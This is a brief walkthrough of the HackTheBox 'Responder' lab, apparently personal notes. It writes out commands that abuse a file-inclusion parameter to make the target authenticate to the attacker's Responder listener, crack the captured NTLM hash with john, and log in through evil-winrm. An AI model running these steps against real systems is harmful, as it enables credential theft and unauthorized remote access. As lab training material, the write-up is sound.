![[Responder.png]]
#HackTheBox #Starting-point #VeryEasy 
## Scan Port
```bash
nmap -sV {TARGET IP} -T4
```
The result is `80/tcp` service of `http`
## Connect to Responder
### Step 1
Open your browser, paste the `TARGET IP`. The result is unable to connect, because we should add host of `TARGET IP`.
Let go back to terminal, edit `hosts` with `sudo nano`(`/etc/hosts`)
```bash
sudo nano /etc/hosts
```
Add the `TARGET IP` and the domain name target
```note
{TARGET IP}  {DOMAIN NAME}
```
Open your browser again, paste `TARGET IP`. Tadaa... can connect to http/website.
let's try to change language and what's different than before (From EN to FR/DE)
Yesss!! You can see?! URL!!! From `DOMAIN NAME` to `DOMAIN NAME/...?page=french.html`
Okay, next we will connect it to the responder with python3. Besause we will use python3, we can use `Responder.py`, location responder.py in `/usr/share/responder`.
```bash
python3 /usr/share/responder/Responder.py -I tun0
```
`-I` for Interface
`tun0` is My IP Address with vpn
Open your browser again, let's try change the url to `DOMAIN NAME/...?page=//{MY IP}`. Let's check the responder, there are results, right? copy the `hash`, then put them in a new file (ex : hash.txt)
After that, we pass the hash file to john and crack the password for the Administrator Account.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt {hash.txt}
```
The result is the password for the Administrator Account.
### Step 2
We will connect to WinRM, because PowerShell isn't installed on Linux, we can use tool `evil-winrm`
```bash
evil-winrm -i {TARGET IP} -u {username} -p {password}
```
Find the flag in user Mike. Congratulations!!😁👍